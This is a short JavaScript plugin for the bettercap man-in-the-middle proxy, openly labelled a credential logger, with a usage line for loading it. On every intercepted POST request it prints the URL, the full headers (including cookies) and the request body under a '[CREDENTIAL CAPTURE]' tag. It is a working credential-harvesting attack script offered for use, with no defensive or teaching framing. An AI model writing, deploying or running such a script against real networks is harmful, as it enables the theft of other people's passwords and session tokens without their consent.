// Simple credential logger for bettercap HTTP proxy
// Usage: set http.proxy.script /path/to/credential_logger.js

function onRequest(req, res) {
    if (req.Method == "POST") {
        console.log("[CREDENTIAL CAPTURE] " + new Date().toISOString());
        console.log("URL: " + req.URL);
        console.log("Headers: " + JSON.stringify(req.Headers));
        console.log("Body: " + req.ReadBody());
        console.log("-".repeat(80));
    }
}

function onResponse(req, res) {
    // Optional: log responses too
}